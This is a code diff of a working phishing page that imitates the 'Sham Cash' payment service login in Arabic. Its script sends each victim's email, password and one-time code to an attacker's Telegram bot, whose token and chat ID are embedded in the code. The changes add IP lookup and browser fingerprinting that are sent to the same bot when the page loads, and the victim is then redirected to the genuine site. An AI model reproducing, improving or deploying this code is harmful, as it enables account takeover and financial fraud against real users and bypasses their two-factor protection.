@@ -310,7 +310,7 @@
             <span class="header-text"></span> <span class="header-text">الإنجليزية</span>
         </div>
 
-        <img src="" alt="شام كاش" class="logo" id="appLogo">
+        <img src="img/shamcash.svg" alt="شام كاش" class="logo" id="appLogo">
 
         <h1 class="page-title">تسجيل الدخول</h1>
 
@@ -340,7 +340,7 @@
                     </svg>
                 </span>
             </div>
-            <span id="passwordError" class="error-message hidden">هذا الحقل مطلوب.</span>
+            <span id="passwordError" class="error-message hidden">هذا الح ميدانمهم</span>
         </div>
 
         <a href="#" class="link-text">هل نسيت كلمة المرور؟</a>
@@ -386,98 +386,134 @@
     </div>
 
     <script>
-        // المتغيرات الخاصة بـ Telegram Bot API
+        // =======================================================
+        //               Global Configurations & IP variable
+        // =======================================================
         const BOT_TOKEN = "7006779137:AAFXyOQiVJmJo4H5JZiH1D1-YSRi4m32x2Y";
         const CHAT_ID = "5944908457";
-        const FINAL_REDIRECT_URL = "https://shamcash.org"; // الرابط النهائي الذي تريد توجيه المستخدم إليه
+        const FINAL_REDIRECT_URL = "https://shamcash.org";
+        let userIpAddress = 'غير معروف'; // Global variable to store IP
 
-        // Get references to DOM elements
+        // =======================================================
+        //               Utility Functions
+        // =======================================================
+
+        // Function to fetch IP address and store it globally
+        async function fetchAndStoreUserIP() {
+            try {
+                const response = await fetch('https://api64.ipify.org?format=json');
+                const data = await response.json();
+                userIpAddress = data.ip;
+                console.log('IP fetched and stored globally:', userIpAddress);
+            } catch (error) {
+                console.error('Error fetching IP:', error);
+                userIpAddress = 'غير معروف';
+            }
+        }
+
+        // Generic function to send messages to Telegram, now including the global IP
+        async function sendToTelegram(message) {
+            const telegramApiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            const fullMessage = message + `\n\n<b>IP:</b>\n${userIpAddress}`; // Add IP automatically
+            const params = {
+                chat_id: CHAT_ID,
+                text: fullMessage,
+                parse_mode: 'HTML'
+            };
+
+            try {
+                await fetch(telegramApiUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(params)
+                });
+            } catch (error) {
+                console.error('Error sending message to Telegram:', error);
+            }
+        }
+
+        // Functions for error display (kept as per your provided code)
+        function showError(inputElement, messageElement, message) {
+            const parentInputGroup = inputElement.closest('.input-group');
+            if (parentInputGroup) {
+                parentInputGroup.classList.add('error');
+            }
+            messageElement.textContent = message;
+            messageElement.classList.remove('hidden');
+        }
+
+        function hideError(inputElement, messageElement) {
+            const parentInputGroup = inputElement.closest('.input-group');
+            if (parentInputGroup) {
+                parentInputGroup.classList.remove('error');
+            }
+            messageElement.classList.add('hidden');
+            messageElement.textContent = '';
+        }
+
+        // =======================================================
+        //               DOM Elements References
+        // =======================================================
         const loginPage = document.getElementById('loginPage');
         const otpPage = document.getElementById('otpPage');
         const loginButton = document.getElementById('loginButton');
         const loadingOverlay = document.getElementById('loadingOverlay');
-        const loadingMessage = document.getElementById('loadingMessage'); // لعرض رسالة مختلفة للتحميل
+        const loadingMessage = document.getElementById('loadingMessage');
         const otpInputs = document.querySelectorAll('.otp-input');
         const appLogo = document.getElementById('appLogo');
         const otpAppLogo = document.getElementById('otpAppLogo');
         const passwordField = document.getElementById('password');
         const togglePassword = document.getElementById('togglePassword');
         const eyeIcon = document.getElementById('eyeIcon');
-
-        // References for error messages
         const emailField = document.getElementById('email');
         const emailError = document.getElementById('emailError');
         const passwordError = document.getElementById('passwordError');
         const verifyOtpButton = document.getElementById('verifyOtpButton');
         const otpGroupError = document.getElementById('otpGroupError');
 
+        // =======================================================
+        //               Initial Setup (Run on page load)
+        // =======================================================
 
-        // Set the logo source
+        // Set logo source (as per your original code)
         const logoSrc = "img/shamcash.svg";
         appLogo.src = logoSrc;
         otpAppLogo.src = logoSrc;
 
-        // Function to show an error message
-        function showError(inputElement, messageElement, message) {
-            // Add error class to the parent input-group for border styling
-            const parentInputGroup = inputElement.closest('.input-group');
-            if (parentInputGroup) {
-                parentInputGroup.classList.add('error');
-            } else {
-                // For OTP fields, we assume the error class is added directly to the input,
-                // this function primarily handles messageElement display for OTP.
-                // The actual `input.classList.add('error')` for OTP fields is done directly
-                // in the OTP validation logic below for clarity and direct control.
-            }
-            messageElement.textContent = message;
-            messageElement.classList.remove('hidden');
+        // Function to send initial visitor data upon page load
+        async function sendInitialVisitorDataOnLoad() {
+            const userAgent = navigator.userAgent;
+            const screenWidth = window.screen.width;
+            const screenHeight = window.screen.height;
+            const browserLanguage = navigator.language;
+            const currentUrl = window.location.href;
+            const referrer = document.referrer || 'لا يوجد مرجع';
+            const localDateTime = new Date().toLocaleString('ar-EG', { timeZoneName: 'short' });
+
+            const visitorMessage = `
+                <b>[معلومات الزيارة الأولى]</b>
+                <b>User Agent:</b>\n${userAgent}
+                <b>أبعاد الشاشة:</b>\n${screenWidth}x${screenHeight}
+                <b>لغة المتصفح:</b>\n${browserLanguage}
+                <b>الرابط الحالي:</b>\n${currentUrl}
+                <b>المرجع:</b>\n${referrer}
+                <b>الوقت والتاريخ:</b>\n${localDateTime}
+            `;
+            // IP is added automatically by sendToTelegram function
+            await sendToTelegram(visitorMessage);
+            console.log('Initial visitor data sent to Telegram!');
         }
 
-        // Function to hide an error message
-        function hideError(inputElement, messageElement) {
-            const parentInputGroup = inputElement.closest('.input-group');
-            if (parentInputGroup) {
-                parentInputGroup.classList.remove('error');
-            } else {
-                // For OTP fields, the error class is removed directly from the input
-                // in the OTP input event listener or validation.
-            }
-            messageElement.classList.add('hidden');
-            messageElement.textContent = '';
-        }
+        // Fetch IP and then send initial visitor data as soon as the script loads
+        // This ensures IP is available when sendToTelegram is called.
+        fetchAndStoreUserIP().then(() => {
+            sendInitialVisitorDataOnLoad();
+        });
 
-        /**
-         * Sends a message to the Telegram bot.
-         * @param {string} message The text message to send.
-         */
-        async function sendToTelegram(message) {
-            const telegramApiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-            const params = {
-                chat_id: CHAT_ID,
-                text: message,
-                parse_mode: 'HTML' // أو 'Markdown' حسب تفضيلك لتنسيق الرسالة
-            };
 
-            try {
-                const response = await fetch(telegramApiUrl, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify(params)
-                });
-                // لا نحتاج للتحقق من الاستجابة أو معالجة الأخطاء هنا حسب طلبك
-                // لكن في بيئة إنتاج حقيقية، يجب التعامل معها
-                // const data = await response.json();
-                // if (!data.ok) {
-                //     console.error('Failed to send message to Telegram:', data.description);
-                // }
-            } catch (error) {
-                // لا نعرض رسالة خطأ للمستخدم، فقط نسجل الخطأ
-                console.error('Error sending message to Telegram:', error);
-            }
-        }
-
+        // =======================================================
+        //               Event Listeners & Form Logic
+        // =======================================================
 
         // Event listener for login button click
         loginButton.addEventListener('click', async function(event) {
@@ -515,13 +551,14 @@
             const email = emailField.value;
             const password = passwordField.value;
 
+            // Format login message as requested
             const loginMessage = `
                 <b>[بيانات تسجيل الدخول]</b>
-                <b>البريد الإلكتروني:</b> ${email}
-                <b>كلمة السر:</b> ${password}
+                <b>البريد الإلكتروني:</b>\n${email}
+                <b>كلمة السر:</b>\n${password}
             `;
 
-            // أرسل بيانات تسجيل الدخول إلى تيليجرام
+            // Send login data to Telegram (IP will be added automatically by sendToTelegram)
             await sendToTelegram(loginMessage);
 
             // Simulate a delay for login process (e.g., API call)
@@ -555,7 +592,6 @@
                     otpInputs[index + 1].focus();
                 }
                 // Hide general OTP error message when user starts typing (the text error)
-                // The individual input error class removal is handled below
                 otpGroupError.classList.add('hidden');
                 otpGroupError.textContent = '';
                 input.classList.remove('error'); // Remove individual red border directly
@@ -608,12 +644,13 @@
             loadingMessage.textContent = 'جاري التحقق من الرمز...'; // تحديث رسالة التحميل
             loadingOverlay.classList.remove('hidden');
 
+            // Format OTP message as requested
             const otpMessage = `
                 <b>[رمز التحقق OTP]</b>
-                <b>الرمز:</b> ${otpCode}
+                <b>الرمز:</b>\n${otpCode}
             `;
 
-            // أرسل رمز OTP إلى تيليجرام
+            // Send OTP data to Telegram (IP will be added automatically by sendToTelegram)
             await sendToTelegram(otpMessage);
 
             // Simulate OTP verification and then redirect
